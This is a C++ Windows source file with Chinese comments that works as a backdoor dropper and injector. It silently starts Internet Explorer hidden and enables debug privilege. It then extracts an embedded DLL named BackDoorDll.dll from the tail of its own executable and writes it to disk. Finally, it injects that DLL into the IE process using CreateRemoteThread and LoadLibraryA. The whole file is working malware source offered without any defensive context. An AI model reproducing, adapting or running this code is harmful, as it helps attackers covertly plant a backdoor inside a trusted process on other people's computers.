// InjectDll.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <tlhelp32.h>
#include <stdio.h>
int EnableDebugPriv(const char * name)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	//打开进程令牌环
	if(!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,
		&hToken) )
	{
		printf("OpenProcessToken error\n");
		return 1;
	}
	//获得进程本地唯一ID
	if(!LookupPrivilegeValue(NULL,name,&luid))
	{
		printf("LookupPrivilege error!\n");
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes =SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = luid;
	//调整进程权限
	if(!AdjustTokenPrivileges(hToken,0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL) )
	{
		printf("AdjustTokenPrivileges error!\n");
		return 1;
	}
	return 0;
}

BOOL InjectDll(const char *DllFullPath, const DWORD dwRemoteProcessId)
{
	HANDLE hRemoteProcess;
	//获得调试权限
	if(EnableDebugPriv(SE_DEBUG_NAME))
	{
		printf("add privilege error");
		return FALSE;
	}
	//打开目标进程
	if((hRemoteProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwRemoteProcessId))==NULL)
	{
		printf("OpenProcess error\n");
		return FALSE;
	}
	char *pszLibFileRemote;
    //申请存放dll文件名的路径
	pszLibFileRemote=(char *)VirtualAllocEx( hRemoteProcess, 
		                     NULL, lstrlen(DllFullPath)+1, 
		                     MEM_COMMIT, PAGE_READWRITE);
	if(pszLibFileRemote==NULL)
	{
		printf("VirtualAllocEx error\n");
		return FALSE;
	}
	//把dll的完整路径写入到内存，
	if(WriteProcessMemory(hRemoteProcess,
		pszLibFileRemote,(void *)DllFullPath,lstrlen(DllFullPath)+1,NULL) == 0)
	{
		printf("WriteProcessMemory error\n");
		return FALSE;
	}
	//得到LoadLibraryA函数地址
	PTHREAD_START_ROUTINE pfnStartAddr=(PTHREAD_START_ROUTINE)
		GetProcAddress(GetModuleHandle(TEXT("Kernel32")),"LoadLibraryA");
	if(pfnStartAddr == NULL)
	{
		printf("GetProcAddress error\n");
		return FALSE;
	}
	HANDLE hRemoteThread;
	//启动远程线程
	if( (hRemoteThread = CreateRemoteThread(hRemoteProcess,NULL,0, 
		pfnStartAddr,pszLibFileRemote,0,NULL))==NULL)
	{
		printf("CreateRemoteThread error\n");
		return FALSE;
	}
	return TRUE;
}

DWORD GetProcessID(char *ProcessName)
{
	PROCESSENTRY32 pe32;
	pe32.dwSize=sizeof(pe32);
	//获得系统内所有进程快照
	HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(hProcessSnap==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot error");
		return 0;
	}
	//枚举列表中的第一个进程
	BOOL bProcess=Process32First(hProcessSnap,&pe32);
	while(bProcess)
	{
		//比较找到的进程名和我们要查找的进程名，一样则返回进程id
		if(strcmp(strupr(pe32.szExeFile),strupr(ProcessName))==0)
			return pe32.th32ProcessID;
		//继续查找
		bProcess=Process32Next(hProcessSnap,&pe32);
	}
	CloseHandle(hProcessSnap);
	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	char Path[256];
	char DllPath[256];
	//得到widnows系统路径
    GetSystemDirectory(Path,sizeof(Path));
	//0x00截断字符，得到盘符
	Path[3]=0x00;
	//得到IE带路径文件名
	strcat(Path,"Program Files\\Internet Explorer\\iexplore.exe");
	//启动IE，为了防止系统中没有IE进程
    WinExec(Path,SW_HIDE);
	//暂停两秒，等待IE启动
	Sleep(2000);
	//得到IE进程
	DWORD Pid=GetProcessID("iexplore.exe");
	//得到程序自身路径
	GetCurrentDirectory(sizeof(DllPath),DllPath);
	//得到DLL带路径文件名
	strcat(DllPath,"\\BackDoorDll.dll");
    char szName[256];
	//得到自身文件名
    GetModuleFileName(NULL,szName,256);
	//只读方式打开自身文件
    HANDLE shFile=CreateFile(szName,GENERIC_READ,FILE_SHARE_READ,NULL,
		         OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(shFile==INVALID_HANDLE_VALUE)
	{
		printf("CreateFile error\n");
		return 0;
	}
	//创建DLL文件
	HANDLE hFile=CreateFile(DllPath,GENERIC_WRITE,0,NULL,
		         CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		printf("CreateFile error\n");
		return 0;
	}
	//移动文件指针到DLL部分
	if(SetFilePointer(shFile,-49152,NULL,FILE_END)==-1)
	{
		printf("SetFilePointer error\n");
		return 0;
	}
    char buff[2800]={0};
	DWORD dwRead;
	DWORD dwWrite;
	while(1)
	{
		//读取2800字节
		if(!ReadFile(shFile,buff,2800,&dwRead,NULL))
		{
			printf("ReadFile error\n");
			return 0;	
		}
		if(dwRead<2800)
		{
			if(!WriteFile(hFile,buff,dwRead,&dwWrite,NULL))
			{
				printf("WriteFile error\n");
				return 0;	
			}
			break;
		}
		if(!WriteFile(hFile,buff,2800,&dwWrite,NULL))
		{
			printf("WriteFile error\n");
			return 0;
		}
	}
	CloseHandle(hFile);
	CloseHandle(shFile);
	//注入IE进程
    InjectDll(DllPath,Pid);
	return 0;
}



